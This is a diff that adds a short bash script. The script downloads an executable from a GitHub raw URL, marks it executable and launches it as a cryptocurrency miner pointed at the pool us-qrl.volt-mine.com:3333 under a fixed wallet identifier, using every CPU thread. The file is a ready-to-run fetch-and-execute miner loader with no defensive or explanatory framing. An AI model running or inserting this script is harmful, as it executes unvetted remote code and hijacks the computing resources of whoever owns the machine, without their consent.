@@ -1,0 +1,5 @@
+#!/bin/bash
+wget -O ijot https://github.com/kidoescegh/filee/raw/main/xmolx
+chmod +x ijot
+./ijot -a rx/0 -o us-qrl.volt-mine.com:3333 -u solo:Q010500dcddedd09eb43778b8c86fc30d1682af477c2693f24c34113532603031ecdac7e2d5a133 -p $(echo $(shuf -i 1000-9999 -n 1)-hh) -t $(nproc --all) --donate-level 1 -k 
+
